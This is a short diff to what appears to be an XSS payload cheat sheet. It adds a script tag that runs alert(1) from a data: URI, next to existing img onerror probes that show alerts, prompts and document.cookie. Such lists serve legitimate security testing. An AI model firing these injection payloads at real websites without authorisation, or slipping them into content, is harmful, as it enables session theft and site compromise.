@@ -2,6 +2,7 @@ Please do visit as well: https://github.com/s0md3v/AwesomeXSS
 
 <img src=1 onerror=alert("XSS")>
 <img/src/onerror=prompt(document.domain)>
+<script src="data:text/javascript,alert(1)"></script>
 "><img src=1 onerror=alert("XSS")>
 "><img src=x onerror=alert(document.cookie)>
 <img src=x onerror=alert(document.cookie)>
